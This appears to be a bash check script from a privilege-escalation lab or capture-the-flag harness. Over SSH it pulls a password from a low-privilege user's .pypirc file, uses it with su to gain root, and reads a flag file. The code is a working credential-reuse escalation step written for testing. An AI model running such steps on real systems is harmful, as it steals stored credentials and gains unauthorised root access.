#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run 'PASS=$(grep -oE "password" /home/lowpriv/.pypirc | head -1); printf "%s\n" "$PASS" | su - root -c "cat /root/flag.txt"')"
assert_root_output "${out}"
